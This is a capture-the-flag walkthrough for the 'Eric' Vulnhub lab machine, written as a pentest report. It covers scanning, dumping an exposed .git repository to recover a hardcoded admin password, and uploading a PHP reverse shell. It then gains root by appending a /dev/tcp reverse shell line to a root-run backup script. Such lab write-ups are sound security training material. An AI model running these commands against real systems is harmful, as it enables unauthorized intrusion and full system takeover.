# Eric Vulnhub

## Introduction
This pentest report provides details of the penetration testing conducted on the target system with IP address 192.168.1.40. The assessment involved scanning, enumeration, identifying vulnerabilities, and gaining unauthorized access to the target system.

### Network Discovery

#### Netdiscover
```bash
netdiscover -r 192.168.1.0/24
```

The Netdiscover scan revealed the target's IP address: 192.168.1.40.

### Port Scanning

#### RustScan
```bash
sudo rustscan -a 192.168.1.40 --range 1-65000 --ulimit 5000
```

The RustScan results indicated the following open ports and services:

- Port 22/tcp: SSH
- Port 80/tcp: HTTP

### Web Application Assessment

#### Directory Bruteforcing (Dirb)
```bash
dirb http://192.168.1.40/
```

Dirb scanning identified the following directories and files:

- /.git/HEAD
- /admin.php
- /index.php
- /server-status
- /upload/

#### Web Application Exploration

- We accessed the `/admin.php` page, which required a PHP session cookie (PHPSESSID).
- The contents of `.git/HEAD` revealed `refs/heads/master`.

### Exploitation

#### Git Repository Extraction
We used GitTools to extract the Git repository from `.git/HEAD`.

```bash
./gitdumper.sh http://192.168.1.40/.git/ dest-dir

./extractor.sh /home/daniel/GitHacker/GitTools/Dumper/dest-dir /tmp/mygitrepodump

```

#### Reviewing Repository Contents

if we grep "admin" / in the /tmp/mygitrepodump

We found credentials in `2-3db5628b550f5c9c9f6f663cd158374035a6eaa0/admin.php`:
```php
if ($_POST['username'] == 'admin' && $_POST['password'] == 'st@mpch0rdt.ightiRu$glo0mappL3') {
```

#### Unauthorized Access
We used the discovered credentials to log in to the web application.

- Username: admin
- Password: st@mpch0rdt.ightiRu$glo0mappL3

  ![image](https://github.com/fullopsec/Pentests/assets/114147068/195ed57c-7c46-4a75-b20a-e55e5a72c99f)


### Reverse Shell Upload

We uploaded a PHP reverse shell using the web interface and listened for incoming connections:
```bash
nc -nlvp 1234
```

![image](https://github.com/fullopsec/Pentests/assets/114147068/dc9b1c2e-9f7c-4fdb-93b1-124ff167833a)


The reverse shell was successfully uploaded ( http://192.168.1.40/upload/a.php ) and executed as the `www-data` user.

### Privilege Escalation

#### Obtaining a Shell
We improved the shell with Python:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Backup Script Exploitation
We discovered a backup script (`backup.sh`) that copied data to a web server and executed as root.

![image](https://github.com/fullopsec/Pentests/assets/114147068/d4affa33-72a0-44df-96ee-e67ebc0f3412)


We appended a reverse shell command to `backup.sh`:
```bash
echo "sh -i >& /dev/tcp/192.168.1.22/9001 0>&1" >> backup.sh
```

Then, we listened for the reverse shell connection:
```bash
nc -lvnp 9001
```

![image](https://github.com/fullopsec/Pentests/assets/114147068/a368b633-4166-4c68-a342-e2d144b840e7)


This allowed us to gain root access to the target system.

## Conclusion

This concludes the pentest report for the target system with IP address 192.168.1.40. The assessment identified vulnerabilities in the web application, leading to unauthorized access and privilege escalation. The backup script exploit resulted in root-level access to the system.
